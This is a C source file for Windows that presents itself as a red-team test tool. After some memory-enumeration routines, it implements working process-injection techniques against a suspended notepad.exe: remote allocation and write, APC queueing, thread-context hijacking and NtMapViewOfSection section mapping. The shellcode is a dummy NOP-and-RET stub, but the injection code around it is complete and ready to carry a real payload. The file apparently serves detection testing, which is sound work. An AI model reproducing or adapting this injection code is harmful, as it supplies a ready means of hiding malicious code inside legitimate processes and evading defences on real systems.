#include <windows.h>
#include <stdio.h>
#include <string.h>

// Dummy shellcode (just returns - 0xC3)
static unsigned char g_dummyShellcode[] = {
    0x90, 0x90, 0x90, 0x90,  // NOP sled
    0xC3                      // RET
};

// =============================================================================
// NT API Definitions for Module 5
// =============================================================================

typedef NTSTATUS(NTAPI* pNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
    );

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
    );

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
    );

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

#ifndef SEC_COMMIT
#define SEC_COMMIT 0x8000000
#endif

// =============================================================================
// MODULE 0: Memory Enumeration
// =============================================================================

const char* GetProtectionString(DWORD protect) {
    if (protect & PAGE_NOACCESS) return "---";
    if (protect & PAGE_EXECUTE_READWRITE) return "RWX";
    if (protect & PAGE_EXECUTE_READ) return "R-X";
    if (protect & PAGE_EXECUTE) return "--X";
    if (protect & PAGE_READWRITE) return "RW-";
    if (protect & PAGE_READONLY) return "R--";
    if (protect & PAGE_WRITECOPY) return "RWC";
    if (protect & PAGE_EXECUTE_WRITECOPY) return "RXC";
    return "???";
}

const char* GetStateString(DWORD state) {
    if (state & MEM_COMMIT) return "COMMIT";
    if (state & MEM_RESERVE) return "RESERVE";
    if (state & MEM_FREE) return "FREE";
    return "UNKNOWN";
}

const char* GetTypeString(DWORD type) {
    if (type & MEM_IMAGE) return "IMAGE";
    if (type & MEM_MAPPED) return "MAPPED";
    if (type & MEM_PRIVATE) return "PRIVATE";
    return "";
}

void EnumerateMemoryRegions() {
    printf("\n=== MEMORY REGIONS ===\n\n");
    printf("%-18s %-18s %-10s %-8s %-8s %-10s\n",
        "Base Address", "Region Size", "State", "Protect", "Type", "Alloc Protect");
    printf("================================================================================\n");

    MEMORY_BASIC_INFORMATION mbi = { 0 };
    LPVOID address = NULL;
    SIZE_T totalCommitted = 0;
    SIZE_T totalReserved = 0;
    int regionCount = 0;

    while (VirtualQuery(address, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State != MEM_FREE) {
            printf("0x%016p 0x%016zx %-10s %-8s %-8s %-10s\n",
                mbi.BaseAddress,
                mbi.RegionSize,
                GetStateString(mbi.State),
                GetProtectionString(mbi.Protect),
                GetTypeString(mbi.Type),
                GetProtectionString(mbi.AllocationProtect));

            if (mbi.State == MEM_COMMIT) {
                totalCommitted += mbi.RegionSize;
            }
            if (mbi.State == MEM_RESERVE) {
                totalReserved += mbi.RegionSize;
            }
            regionCount++;
        }

        address = (LPVOID)((SIZE_T)mbi.BaseAddress + mbi.RegionSize);
    }

    printf("================================================================================\n");
    printf("Total regions: %d\n", regionCount);
    printf("Total committed: %zu bytes (%.2f MB)\n", totalCommitted, totalCommitted / (1024.0 * 1024.0));
    printf("Total reserved: %zu bytes (%.2f MB)\n", totalReserved, totalReserved / (1024.0 * 1024.0));
    printf("\n");
}

void PrintMemorySegments() {
    printf("\n=== MEMORY SEGMENTS ===\n\n");
    printf("%-12s %-18s %-8s %-18s\n", "Segment", "Address", "Perm", "Size");
    printf("========================================================================\n");

    MEMORY_BASIC_INFORMATION mbi = { 0 };

    // Get module handle for the executable
    HMODULE hModule = GetModuleHandleA(NULL);
    
    // Query .text section details
    if (hModule && VirtualQuery((LPVOID)hModule, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        printf("%-12s 0x%016p %-8s 0x%016zx (%.2f KB)\n", 
            ".text", 
            mbi.AllocationBase, 
            GetProtectionString(mbi.Protect),
            mbi.RegionSize,
            mbi.RegionSize / 1024.0);
    }

    // Query .data segment details
    if (VirtualQuery((LPVOID)&g_dummyShellcode, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        printf("%-12s 0x%016p %-8s 0x%016zx (%.2f KB)\n", 
            ".data", 
            mbi.AllocationBase, 
            GetProtectionString(mbi.Protect),
            mbi.RegionSize,
            mbi.RegionSize / 1024.0);
    }

    // Query stack details
    int stackVar = 0;
    if (VirtualQuery((LPVOID)&stackVar, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        printf("%-12s 0x%016p %-8s 0x%016zx (%.2f KB)\n", 
            "Stack", 
            mbi.AllocationBase, 
            GetProtectionString(mbi.Protect),
            mbi.RegionSize,
            mbi.RegionSize / 1024.0);
    }

    // Query heap details
    LPVOID heapAlloc = HeapAlloc(GetProcessHeap(), 0, 64);
    if (heapAlloc) {
        if (VirtualQuery(heapAlloc, &mbi, sizeof(mbi)) == sizeof(mbi)) {
            printf("%-12s 0x%016p %-8s 0x%016zx (%.2f KB)\n", 
                "Heap", 
                mbi.AllocationBase, 
                GetProtectionString(mbi.Protect),
                mbi.RegionSize,
                mbi.RegionSize / 1024.0);
        }
        HeapFree(GetProcessHeap(), 0, heapAlloc);
    }

    // Query PEB (Process Environment Block) address
#ifdef _WIN64
    PVOID peb = (PVOID)__readgsqword(0x60);
#else
    PVOID peb = (PVOID)__readfsdword(0x30);
#endif
    if (VirtualQuery(peb, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        printf("%-12s 0x%016p %-8s 0x%016zx (%.2f KB)\n", 
            "PEB", 
            mbi.AllocationBase, 
            GetProtectionString(mbi.Protect),
            mbi.RegionSize,
            mbi.RegionSize / 1024.0);
    }

    printf("========================================================================\n");
    printf("\n");
}

// =============================================================================
// MODULE 1: Thread Suspend/Resume Test
// =============================================================================


// Thread: Will live for 1s
static DWORD WINAPI WorkerThread(LPVOID param) {
    printf("[Worker] Thread %lu started\n", GetCurrentThreadId());

    for (int i = 0; i < 10; i++) {
        printf("[Worker] Working... iteration #%d\n", i + 1);
        Sleep(100);
    }

    printf("[Worker] Thread exiting\n");
    return 0;
}

void TestThreadSuspendResume() {
    printf("\n=== TEST 1: Thread Suspend/Resume ===\n\n");

    HANDLE hThread = CreateThread(NULL, 0, WorkerThread, NULL, 0, NULL);
    if (!hThread) {
        printf("[!] CreateThread failed: %lu\n", GetLastError());
        return;
    }
    printf("[Main] Created worker thread %lu\n", GetThreadId(hThread));

    Sleep(50);

    printf("[Main] Suspending worker thread\n");
    DWORD prevSuspendCount = SuspendThread(hThread);
    if (prevSuspendCount == (DWORD)-1) {
        printf("[!] SuspendThread failed: %lu\n", GetLastError());
    }
    else {
        printf("[Main] Thread suspended (previous suspend count: %lu)\n", prevSuspendCount);
    }

    printf("[Main] Thread is suspended (pausing for 0.1 second to demonstrate)...\n");
    Sleep(100);

    printf("[Main] Resuming worker thread\n");
    DWORD newSuspendCount = ResumeThread(hThread);
    if (newSuspendCount == (DWORD)-1) {
        printf("[!] ResumeThread failed: %lu\n", GetLastError());
    }
    else {
        printf("[Main] Thread resumed (previous suspend count: %lu)\n", newSuspendCount);
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    printf("[Main] Test 1 done\n");
}

// =============================================================================
// MODULE 2: Process Spawn + Shellcode Allocation
// =============================================================================

void TestProcessSpawnWithShellcode() {
    printf("\n=== TEST 2: Process Spawn with Shellcode Allocation ===\n\n");

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    // Spawn notepad as a target process
    printf("[Main] Spawning child process (notepad.exe)...\n");
    if (!CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi)) {
        printf("[!] CreateProcess failed: %lu\n", GetLastError());
        return;
    }

    printf("[Main] Process created - PID: %lu, TID: %lu\n", pi.dwProcessId, pi.dwThreadId);

    // Allocate memory in the target process
    SIZE_T shellcodeSize = sizeof(g_dummyShellcode);
    LPVOID pRemoteMemory = VirtualAllocEx(
        pi.hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!pRemoteMemory) {
        printf("[!] VirtualAllocEx failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    printf("[Main] Allocated %zu bytes at 0x%p in target process\n",
        shellcodeSize, pRemoteMemory);

    // Write shellcode to the allocated memory
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(
        pi.hProcess,
        pRemoteMemory,
        g_dummyShellcode,
        shellcodeSize,
        &bytesWritten)) {
        printf("[!] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    printf("[Main] Wrote %zu bytes of shellcode to target process\n", bytesWritten);

    // Change memory protection to executable
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(
        pi.hProcess,
        pRemoteMemory,
        shellcodeSize,
        PAGE_EXECUTE_READ,
        &oldProtect)) {
        printf("[!] VirtualProtectEx failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    printf("[Main] Changed memory protection to PAGE_EXECUTE_READ\n");
    printf("[Main] Shellcode address: 0x%p\n", pRemoteMemory);

    // Resume the process so it runs normally
    printf("[Main] Resuming child process...\n");
    ResumeThread(pi.hThread);

    printf("[Main] Process is running. Waiting a second before terminating...\n");
    Sleep(1000);

    printf("[Main] Terminating child process...\n");
    TerminateProcess(pi.hProcess, 0);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("[Main] Test 2 done\n");
}

// =============================================================================
// MODULE 3: Process Spawn + APC Injection
// =============================================================================

void TestProcessSpawnWithAPCInjection() {
    printf("\n=== TEST 3: Process Spawn with APC Injection ===\n\n");

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    printf("[Main] Spawning child process (notepad.exe) in suspended state...\n");
    if (!CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi)) {
        printf("[!] CreateProcess failed: %lu\n", GetLastError());
        return;
    }

    printf("[Main] Process created - PID: %lu, TID: %lu\n", pi.dwProcessId, pi.dwThreadId);

    // Allocate memory in the target process
    SIZE_T shellcodeSize = sizeof(g_dummyShellcode);
    LPVOID pRemoteMemory = VirtualAllocEx(
        pi.hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (!pRemoteMemory) {
        printf("[!] VirtualAllocEx failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    printf("[Main] Allocated %zu bytes at 0x%p in target process\n",
        shellcodeSize, pRemoteMemory);

    // Write shellcode to the allocated memory
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(
        pi.hProcess,
        pRemoteMemory,
        g_dummyShellcode,
        shellcodeSize,
        &bytesWritten)) {
        printf("[!] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    printf("[Main] Wrote %zu bytes of shellcode to target process\n", bytesWritten);

    // Change memory protection to executable
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(
        pi.hProcess,
        pRemoteMemory,
        shellcodeSize,
        PAGE_EXECUTE_READ,
        &oldProtect)) {
        printf("[!] VirtualProtectEx failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    printf("[Main] Changed memory protection to PAGE_EXECUTE_READ\n");

    // Queue APC to the main thread of the target process
    printf("[Main] Queueing APC with shellcode address 0x%p\n", pRemoteMemory);
    if (!QueueUserAPC((PAPCFUNC)pRemoteMemory, pi.hThread, 0)) {
        printf("[!] QueueUserAPC failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    printf("[Main] APC queued successfully\n");
    printf("[Main] Resuming thread to trigger APC...\n");

    ResumeThread(pi.hThread);

    printf("[Main] Process is running. Waiting 2 seconds before terminating...\n");
    Sleep(2000);

    printf("[Main] Terminating child process...\n");
    TerminateProcess(pi.hProcess, 0);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("[Main] Test 3 done\n");
}

// =============================================================================
// MODULE 4: Process Spawn + SetThreadContext Injection
// =============================================================================

void TestProcessSpawnWithSetThreadContext() {
    printf("\n=== TEST 4: Process Spawn with SetThreadContext Injection ===\n\n");

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    printf("[Main] Spawning child process (notepad.exe) in suspended state...\n");
    if (!CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi)) {
        printf("[!] CreateProcess failed: %lu\n", GetLastError());
        return;
    }

    printf("[Main] Process created - PID: %lu, TID: %lu\n", pi.dwProcessId, pi.dwThreadId);

    // Allocate memory in the target process
    SIZE_T shellcodeSize = sizeof(g_dummyShellcode);
    LPVOID pRemoteMemory = VirtualAllocEx(
        pi.hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (!pRemoteMemory) {
        printf("[!] VirtualAllocEx failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    printf("[Main] Allocated %zu bytes at 0x%p in target process\n",
        shellcodeSize, pRemoteMemory);

    // Write shellcode to the allocated memory
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(
        pi.hProcess,
        pRemoteMemory,
        g_dummyShellcode,
        shellcodeSize,
        &bytesWritten)) {
        printf("[!] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    printf("[Main] Wrote %zu bytes of shellcode to target process\n", bytesWritten);

    // Change memory protection to executable
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(
        pi.hProcess,
        pRemoteMemory,
        shellcodeSize,
        PAGE_EXECUTE_READ,
        &oldProtect)) {
        printf("[!] VirtualProtectEx failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    printf("[Main] Changed memory protection to PAGE_EXECUTE_READ\n");

    // Get the thread context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[!] GetThreadContext failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    printf("[Main] Got thread context\n");
#ifdef _WIN64
    printf("[Main] Original RIP: 0x%llx\n", ctx.Rip);
    printf("[Main] Redirecting RIP to shellcode at 0x%p\n", pRemoteMemory);
    ctx.Rip = (DWORD64)pRemoteMemory;
#else
    printf("[Main] Original EIP: 0x%lx\n", ctx.Eip);
    printf("[Main] Redirecting EIP to shellcode at 0x%p\n", pRemoteMemory);
    ctx.Eip = (DWORD)pRemoteMemory;
#endif

    // Set the modified thread context
    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[!] SetThreadContext failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    printf("[Main] Thread context modified successfully\n");
    printf("[Main] Resuming thread to execute shellcode...\n");

    ResumeThread(pi.hThread);

    printf("[Main] Process is running. Waiting a second before terminating...\n");
    Sleep(1000);

    printf("[Main] Terminating child process...\n");
    TerminateProcess(pi.hProcess, 0);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("[Main] Test 4 done\n");
}

// =============================================================================
// MODULE 5: Process Spawn + NtCreateSection/NtMapViewOfSection Injection
// =============================================================================

void TestProcessSpawnWithSectionMapping() {
    printf("\n=== TEST 5: Process Spawn with Section Mapping Injection ===\n\n");

    // Load NT API functions
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[!] Failed to get ntdll.dll handle\n");
        return;
    }

    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    if (!NtCreateSection || !NtMapViewOfSection || !NtUnmapViewOfSection) {
        printf("[!] Failed to resolve NT API functions\n");
        return;
    }

    printf("[Main] NT API functions resolved successfully\n");

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    printf("[Main] Spawning child process (notepad.exe) in suspended state...\n");
    if (!CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi)) {
        printf("[!] CreateProcess failed: %lu\n", GetLastError());
        return;
    }

    printf("[Main] Process created - PID: %lu, TID: %lu\n", pi.dwProcessId, pi.dwThreadId);

    // Create a memory section
    HANDLE hSection = NULL;
    SIZE_T shellcodeSize = sizeof(g_dummyShellcode);
    LARGE_INTEGER sectionSize = { 0 };
    sectionSize.QuadPart = shellcodeSize;

    NTSTATUS status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &sectionSize,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL
    );

    if (!NT_SUCCESS(status)) {
        printf("[!] NtCreateSection failed: 0x%lx\n", status);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    printf("[Main] Created section object successfully\n");

    // Map the section into local process (writable)
    PVOID pLocalView = NULL;
    SIZE_T viewSize = 0;

    status = NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &pLocalView,
        0,
        0,
        NULL,
        &viewSize,
        2, // ViewUnmap
        0,
        PAGE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        printf("[!] NtMapViewOfSection (local) failed: 0x%lx\n", status);
        CloseHandle(hSection);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    printf("[Main] Mapped section into local process at 0x%p\n", pLocalView);

    // Write shellcode to the local view
    memcpy(pLocalView, g_dummyShellcode, shellcodeSize);
    printf("[Main] Wrote %zu bytes of shellcode to local view\n", shellcodeSize);

    // Map the same section into the target process (executable)
    PVOID pRemoteView = NULL;
    viewSize = 0;

    status = NtMapViewOfSection(
        hSection,
        pi.hProcess,
        &pRemoteView,
        0,
        0,
        NULL,
        &viewSize,
        2, // ViewUnmap
        0,
        PAGE_EXECUTE_READ
    );

    if (!NT_SUCCESS(status)) {
        printf("[!] NtMapViewOfSection (remote) failed: 0x%lx\n", status);
        NtUnmapViewOfSection(GetCurrentProcess(), pLocalView);
        CloseHandle(hSection);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    printf("[Main] Mapped section into target process at 0x%p\n", pRemoteView);

    // Get the thread context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[!] GetThreadContext failed: %lu\n", GetLastError());
        NtUnmapViewOfSection(pi.hProcess, pRemoteView);
        NtUnmapViewOfSection(GetCurrentProcess(), pLocalView);
        CloseHandle(hSection);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    printf("[Main] Got thread context\n");
#ifdef _WIN64
    printf("[Main] Original RIP: 0x%llx\n", ctx.Rip);
    printf("[Main] Redirecting RIP to shellcode at 0x%p\n", pRemoteView);
    ctx.Rip = (DWORD64)pRemoteView;
#else
    printf("[Main] Original EIP: 0x%lx\n", ctx.Eip);
    printf("[Main] Redirecting EIP to shellcode at 0x%p\n", pRemoteView);
    ctx.Eip = (DWORD)pRemoteView;
#endif

    // Set the modified thread context
    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[!] SetThreadContext failed: %lu\n", GetLastError());
        NtUnmapViewOfSection(pi.hProcess, pRemoteView);
        NtUnmapViewOfSection(GetCurrentProcess(), pLocalView);
        CloseHandle(hSection);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    printf("[Main] Thread context modified successfully\n");
    printf("[Main] Resuming thread to execute shellcode...\n");

    ResumeThread(pi.hThread);

    printf("[Main] Process is running. Waiting a second before terminating...\n");
    Sleep(1000);

    printf("[Main] Terminating child process...\n");
    TerminateProcess(pi.hProcess, 0);

    // Cleanup
    NtUnmapViewOfSection(GetCurrentProcess(), pLocalView);
    CloseHandle(hSection);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("[Main] Test 5 done\n");
}

// =============================================================================
// Main Menu
// =============================================================================

int main(int argc, char* argv[]) {
    printf("==============================================\n");
    printf("Red Team Test Tool - APC & Process Injection\n");
    printf("==============================================\n\n");

    EnumerateMemoryRegions();
    PrintMemorySegments();

    if (argc > 1) {
        int testNum = atoi(argv[1]);
        switch (testNum) {
        case 0:
            printf("Running all tests...\n\n");
            TestThreadSuspendResume();
            printf("\n");
            TestProcessSpawnWithShellcode();
            printf("\n");
            TestProcessSpawnWithAPCInjection();
            printf("\n");
            TestProcessSpawnWithSetThreadContext();
            printf("\n");
            TestProcessSpawnWithSectionMapping();
            printf("\n==============================================\n");
            printf("All tests completed!\n");
            printf("==============================================\n");
            break;
        case 1:
            TestThreadSuspendResume();
            break;
        case 2:
            TestProcessSpawnWithShellcode();
            break;
        case 3:
            TestProcessSpawnWithAPCInjection();
            break;
        case 4:
            TestProcessSpawnWithSetThreadContext();
            break;
        case 5:
            TestProcessSpawnWithSectionMapping();
            break;
        default:
            printf("Invalid test number. Use 0, 1, 2, 3, 4, or 5.\n");
            return 1;
        }
    }
    else {
        printf("Usage: %s <test_number>\n\n", argv[0]);
        printf("Available tests:\n");
        printf("  0 - Run ALL tests\n");
        printf("  1 - Thread Suspend/Resume (no APC)\n");
        printf("  2 - Process Spawn with Shellcode Allocation\n");
        printf("  3 - Process Spawn with APC Injection\n");
        printf("  4 - Process Spawn with SetThreadContext Injection\n");
        printf("  5 - Process Spawn with Section Mapping Injection\n\n");
        printf("Example: %s 1\n", argv[0]);
        printf("Example: %s 0  (run all tests)\n", argv[0]);
        return 1;
    }

    printf("\n[Main] Press Enter to exit...\n");
    getchar();

    return 0;
}